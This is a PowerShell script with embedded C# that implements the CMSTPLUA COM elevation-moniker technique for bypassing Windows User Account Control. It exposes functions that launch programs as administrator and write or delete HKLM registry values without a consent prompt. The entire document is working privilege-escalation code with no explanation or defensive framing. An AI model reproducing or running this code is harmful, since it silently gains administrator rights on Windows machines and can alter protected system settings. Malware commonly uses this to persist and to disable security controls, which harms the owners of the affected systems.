Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class CMLuaUtil
{
    static readonly Guid CLSID_CMSTPLUA = new Guid("3E5FC7F9-9A51-4367-9063-A120244FBEC7");
    static readonly Guid IID_ICMLuaUtil = new Guid("6EDD6D74-C007-4E75-B76A-E5740995E24C");

    [StructLayout(LayoutKind.Sequential)]
    struct BIND_OPTS3
    {
        public uint cbStruct;
        public uint grfFlags;
        public uint grfMode;
        public uint dwTickCountDeadline;
        public uint dwTrackFlags;
        public uint dwClassContext;
        public uint locale;
        public IntPtr pServerInfo;
        public IntPtr hwnd;
    }

    [DllImport("ole32.dll", CharSet = CharSet.Unicode, PreserveSig = false)]
    static extern void CoGetObject(string pszName, ref BIND_OPTS3 pBindOptions, ref Guid riid, [MarshalAs(UnmanagedType.Interface)] out object ppv);

    [DllImport("ole32.dll")]
    static extern int CoInitialize(IntPtr pvReserved);

    [ComImport]
    [Guid("6EDD6D74-C007-4E75-B76A-E5740995E24C")]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface ICMLuaUtil
    {
        void Method1();
        void Method2();
        void Method3();
        void Method4();
        void Method5();
        void Method6();
        void ShellExec(
            [MarshalAs(UnmanagedType.LPWStr)] string lpFile,
            [MarshalAs(UnmanagedType.LPWStr)] string lpParameters,
            [MarshalAs(UnmanagedType.LPWStr)] string lpDirectory,
            uint fMask,
            uint nShow);
        void SetRegistryStringValue(
            uint hKey,
            [MarshalAs(UnmanagedType.LPWStr)] string lpSubKey,
            [MarshalAs(UnmanagedType.LPWStr)] string lpValueName,
            [MarshalAs(UnmanagedType.LPWStr)] string lpValueString);
        void DeleteRegistryStringValue(
            uint hKey,
            [MarshalAs(UnmanagedType.LPWStr)] string lpSubKey,
            [MarshalAs(UnmanagedType.LPWStr)] string lpValueName);
    }

    static ICMLuaUtil GetElevatedInstance()
    {
        CoInitialize(IntPtr.Zero);
        string moniker = string.Format("Elevation:Administrator!new:{{{0}}}", CLSID_CMSTPLUA.ToString());
        BIND_OPTS3 bo = new BIND_OPTS3();
        bo.cbStruct = (uint)Marshal.SizeOf(bo);
        bo.dwClassContext = 4;
        object obj;
        Guid iid = IID_ICMLuaUtil;
        CoGetObject(moniker, ref bo, ref iid, out obj);
        return (ICMLuaUtil)obj;
    }

    public static bool ShellExec(string file, string args = null, string dir = null)
    {
        try
        {
            var util = GetElevatedInstance();
            util.ShellExec(file, args, dir ?? @"C:\Windows\System32", 0, 1);
            return true;
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error: " + ex.Message);
            return false;
        }
    }

    public static bool SetRegValue(string subKey, string valueName, string valueData)
    {
        try
        {
            var util = GetElevatedInstance();
            util.SetRegistryStringValue(0x80000002, subKey, valueName, valueData); // HKLM
            return true;
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error: " + ex.Message);
            return false;
        }
    }

    public static bool DeleteRegValue(string subKey, string valueName)
    {
        try
        {
            var util = GetElevatedInstance();
            util.DeleteRegistryStringValue(0x80000002, subKey, valueName); // HKLM
            return true;
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error: " + ex.Message);
            return false;
        }
    }
}
"@
